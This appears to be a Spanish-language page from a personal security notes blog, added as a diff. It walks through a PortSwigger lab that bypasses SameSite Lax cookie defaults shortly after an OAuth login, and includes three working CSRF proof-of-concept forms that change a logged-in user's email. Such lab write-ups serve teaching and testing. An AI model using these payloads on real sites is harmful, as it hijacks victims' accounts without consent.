@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;La cookie no tiene nada, asi que es Lax, no podemos convertir la petición de cambio de correo a GET de ninguna forma.&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>La cookie no tiene nada, asi que es Lax, no podemos convertir la petición de cambio de correo a GET de ninguna forma.</p>
+
+<hr />
+
+<h3 id="-por-qué-entonces-se-envía-en-esta-solicitud-post-cross-site">🤔 ¿Por qué entonces se envía en esta solicitud POST cross-site?</h3>
+
+<p>Esto se debe a una <strong>excepción temporal</strong> en navegadores antiguos o mal configurados, <strong>cuando la cookie no tiene explícitamente el atributo <code class="language-plaintext highlighter-rouge">SameSite</code></strong>. Si el servidor omite <code class="language-plaintext highlighter-rouge">SameSite</code>, el navegador <strong>aplica Lax por defecto</strong> desde 2020 aproximadamente (por razones de seguridad).</p>
+
+<p>Sin embargo, <strong>durante los primeros minutos después de un login OAuth</strong>, el navegador aún puede considerar la sesión “iniciada recientemente” y puede permitir una solicitud POST cross-site con cookies si:</p>
+
+<ol>
+  <li>
+    <p>La cookie <strong>no tiene un atributo SameSite explícito</strong>.</p>
+  </li>
+  <li>
+    <p>La sesión aún está activa y reciente.</p>
+  </li>
+  <li>
+    <p>El navegador no está implementando SameSite de forma estricta o tiene una excepción (esto varía entre navegadores y versiones).</p>
+  </li>
+</ol>
+
+<hr />
+
+<h3 id="-por-qué-funciona-el-ataque-csrf-aquí">🧪 Por qué funciona el ataque CSRF aquí</h3>
+
+<p>En el laboratorio:</p>
+
+<ul>
+  <li>
+    <p><strong>No hay token CSRF</strong> en la solicitud POST para cambiar el correo.</p>
+  </li>
+  <li>
+    <p>La cookie de sesión <strong>no tiene <code class="language-plaintext highlighter-rouge">SameSite</code> explícito</strong>, por lo que se usa <code class="language-plaintext highlighter-rouge">Lax</code> por defecto.</p>
+  </li>
+  <li>
+    <p>Al haber iniciado sesión recientemente, el navegador <strong>todavía incluye la cookie en el POST</strong>, incluso siendo una solicitud cross-site.</p>
+  </li>
+</ul>
+
+<hr />
+
+<p>Esto funciona si han pasado menos de dos minutos desde que te has logueado:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+    <span class="nx">history</span><span class="p">.</span><span class="nf">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"foo@bar.com"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>Esto no funciona porque las ventanas emergentes son bloqueadas por defecto:</p>
+<pre><code class="language-HTML">&lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;
+    &lt;input type="hidden" name="email" value="pwned@web-security-academy.net"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+    setTimeout(changeEmail, 5000);
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+&lt;/script&gt;
+</code></pre>
+
+<p>Aquí se envía una ventana emergente solo cuando el usuario clica, por lo que no es bloqueada</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"pwned@portswigger.net"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;p&gt;</span>Click anywhere on the page<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://YOUR-LAB-ID.web-security-academy.net/social-login</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">changeEmail</span><span class="p">,</span> <span class="mi">5000</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">changeEmail</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">submit</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
